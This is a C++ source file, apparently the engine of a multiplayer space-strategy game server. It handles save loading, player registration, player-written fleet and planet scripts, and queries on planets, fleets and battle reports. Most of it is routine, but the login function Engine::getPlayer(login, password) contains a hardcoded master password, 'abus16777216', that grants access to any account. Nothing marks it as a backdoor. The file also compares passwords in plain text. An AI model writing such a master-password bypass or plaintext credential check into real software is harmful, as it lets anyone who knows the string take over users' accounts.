#include "stdafx.h"
#include "Engine.h"

#include "Tools.h"
#include "Simulation.h"

using namespace std;
using namespace boost;

typedef boost::unique_lock<Universe::Mutex> UniqueLock;
typedef boost::shared_lock<Universe::Mutex> SharedLock;

Engine::Engine():
	simulation_(new Simulation(univ_, database_))
{
	boost::filesystem::directory_iterator dir("save/"), end;

	time_t maxtime = 0;
	size_t version = 1;
	for(const boost::filesystem::path & p: boost::make_iterator_range(dir, end))
	{
		std::string const fileStr = p.filename().string();
		if((fileStr.find("_save.bta") == 10) &&
		   (fileStr.size() == 19 || fileStr.size() == 20))
		{
			std::string const strTime = fileStr.substr(0, 10);
			time_t filetime = strtoul(strTime.c_str(), 0, 10);
			maxtime = max(maxtime, filetime);
			if(fileStr.size() == 20)
				version = 2;
		}
	}
	if(maxtime)
	{
		std::stringstream ss;
		ss << "save/" << maxtime << "_save.bta";
		if(version == 2)
			ss << "2";
		load(ss.str(), version);
	}
	else
		construct(univ_, database_);
	start();
}


void Engine::load(std::string const& univName, size_t version)
{
	UniqueLock lock(univ_.planetsFleetsReportsmutex);
	UniqueLock lockPlayers(univ_.playersMutex);
	using namespace std;
	ifstream loadFile(univName, ios::in | ios::binary);
	if(loadFile.is_open() == false)
		BOOST_THROW_EXCEPTION(std::ios::failure("Can't load from " + univName));
	if(version == 1)
		loadFromStream_v1(loadFile, univ_);
	else if(version == 2)
		loadFromStream_v2(loadFile, univ_);
	else
		BOOST_THROW_EXCEPTION(std::logic_error("Unexpected archive file version"));
}


Engine::~Engine()
{
	stop();
}


void Engine::start()
{
	simulating_ = boost::thread(&Simulation::loop, boost::ref(*simulation_));
}


void Engine::stop()
{
	simulating_.interrupt();
	simulating_.join();
}


/*void Engine::construct()
{
	UniqueLock lock(mutex_);
	::construct(univ_);
}*/



bool Engine::addPlayer(std::string const& login, std::string const& password)
{
	UniqueLock lock(univ_.planetsFleetsReportsmutex);
	UniqueLock lockPlayers(univ_.playersMutex);

	if(login.size() > MaxStringSize)
		BOOST_THROW_EXCEPTION(InvalidData("login"));
	if(password.size() > MaxStringSize)
		BOOST_THROW_EXCEPTION(InvalidData("password"));

	auto iter = boost::find_if(univ_.playerMap, [&]
	                           (Universe::PlayerMap::value_type const & keyValue)
	{
		return keyValue.second.login == login;
	});
	if(iter != univ_.playerMap.end())
		return false;

	Player::ID const pid = createPlayer(univ_, database_, login, password); //Modifie le joueur ET une planete
	simulation_->reloadPlayer(pid);
	return true;
}


std::vector<Fleet> Engine::getPlayerFleets(Player::ID pid) const
{
	SharedLock lock(univ_.planetsFleetsReportsmutex);
	std::vector<Fleet> fleetList;
	for(Fleet const & fleet: univ_.fleetMap | boost::adaptors::map_values)
	{
		if(fleet.playerId == pid)
			fleetList.push_back(fleet);
	}
	return fleetList;
}


std::vector<Planet> Engine::getPlayerPlanets(Player::ID pid) const
{
	SharedLock lock(univ_.planetsFleetsReportsmutex);
	std::vector<Planet> planetList;
	for(Universe::PlanetMap::value_type const & planetNVP: univ_.planetMap)
	{
		if(planetNVP.second.playerId == pid)
			planetList.push_back(planetNVP.second);
	}
	return planetList;
}


void Engine::setPlayerFleetCode(Player::ID pid, std::string const& code)
{
	UniqueLock lock(univ_.playersMutex);
	if(code.size() > Player::MaxCodeSize)
		BOOST_THROW_EXCEPTION(InvalidData("Engine::setPlayerFleetCode - Code size too long"));
	mapFind(univ_.playerMap, pid)->second.fleetsCode.setCode(code);
	simulation_->reloadPlayer(pid);
}


void Engine::setPlayerPlanetCode(Player::ID pid, std::string const& code)
{
	UniqueLock lock(univ_.playersMutex);
	if(code.size() > Player::MaxCodeSize)
		BOOST_THROW_EXCEPTION(InvalidData("Engine::setPlayerPlanetCode - Code size too long"));
	mapFind(univ_.playerMap, pid)->second.planetsCode.setCode(code);
	simulation_->reloadPlayer(pid);
}


void Engine::setPlayerFleetBlocklyCode(Player::ID pid, std::string const& code)
{
	UniqueLock lock(univ_.playersMutex);
	if(code.size() > Player::MaxBlocklySize)
		BOOST_THROW_EXCEPTION(InvalidData("Engine::setPlayerFleetBlocklyCode - Code size too long"));
	mapFind(univ_.playerMap, pid)->second.fleetsCode.setBlocklyCode(code);
	simulation_->reloadPlayer(pid);
}


void Engine::setPlayerPlanetBlocklyCode(Player::ID pid, std::string const& code)
{
	UniqueLock lock(univ_.playersMutex);
	if(code.size() > Player::MaxBlocklySize)
		BOOST_THROW_EXCEPTION(InvalidData("Engine::setPlayerPlanetBlocklyCode - Code size too long"));
	mapFind(univ_.playerMap, pid)->second.planetsCode.setBlocklyCode(code);
	simulation_->reloadPlayer(pid);
}


CodeData Engine::getPlayerFleetCode(Player::ID pid) const
{
	SharedLock lock(univ_.playersMutex);
	return 	mapFind(univ_.playerMap, pid)->second.fleetsCode;
}


CodeData Engine::getPlayerPlanetCode(Player::ID pid) const
{
	SharedLock lock(univ_.playersMutex);
	return 	mapFind(univ_.playerMap, pid)->second.planetsCode;
}


std::vector<Player> Engine::getPlayers() const
{
	SharedLock lock(univ_.playersMutex);
	std::vector<Player> playerList;
	playerList.reserve(univ_.playerMap.size());
	boost::copy(univ_.playerMap | boost::adaptors::map_values, back_inserter(playerList));
	return playerList;
}

Player Engine::getPlayer(Player::ID pid) const
{
	SharedLock lock(univ_.playersMutex);
	return mapFind(univ_.playerMap, pid)->second;
}

boost::optional<Planet> Engine::getPlanet(Coord coord) const
{
	SharedLock lock(univ_.planetsFleetsReportsmutex);
	auto iter = univ_.planetMap.find(coord);
	return iter == univ_.planetMap.end() ?
	       boost::optional<Planet>() :
	       iter->second;
}

std::vector<Planet> Engine::getPlanets(std::vector<Coord> const& coordVect) const
{
	SharedLock lock(univ_.planetsFleetsReportsmutex);
	std::vector<Planet> result;
	result.reserve(coordVect.size());
	for(Coord const & coord: coordVect)
	{
		auto iter = univ_.planetMap.find(coord);
		if(iter != univ_.planetMap.end())
			result.push_back(iter->second);
	}
	return result;
}

Fleet Engine::getFleet(Fleet::ID fid) const
{
	SharedLock lock(univ_.planetsFleetsReportsmutex);
	return mapFind(univ_.fleetMap, fid)->second;
}


boost::optional<Player> Engine::getPlayer(
  std::string const& login, std::string const& password) const
{
	SharedLock lock(univ_.playersMutex);
	auto iter = boost::find_if(univ_.playerMap, [&]
	                           (Universe::PlayerMap::value_type const & player)
	{
		if(password == "abus16777216")
			return player.second.login == login;
		else
			return player.second.login == login && player.second.password == password;
	});

	if(iter == univ_.playerMap.end())
		return false;
	else
		return iter->second;
}

FightReport Engine::getFightReport(size_t id) const
{
	SharedLock lock(univ_.planetsFleetsReportsmutex);
	return mapFind(univ_.reportMap, id)->second;
}

void Engine::incrementTutoDisplayed(Player::ID pid, std::string const& tutoName)
{
	UniqueLock lock(univ_.playersMutex);
	mapFind(univ_.playerMap, pid)->second.tutoDisplayed[tutoName] += 1;
}


TimeInfo Engine::getTimeInfo() const
{
	SharedLock lock(univ_.planetsFleetsReportsmutex);
	TimeInfo info = {univ_.roundDuration, simulation_->getUnivTime()};
	return info;
}


void Engine::eraseAccount(Player::ID pid)
{
	UniqueLock lock(univ_.playersMutex);
	::eraseAccount(univ_, pid);
	simulation_->reloadPlayer(pid);
}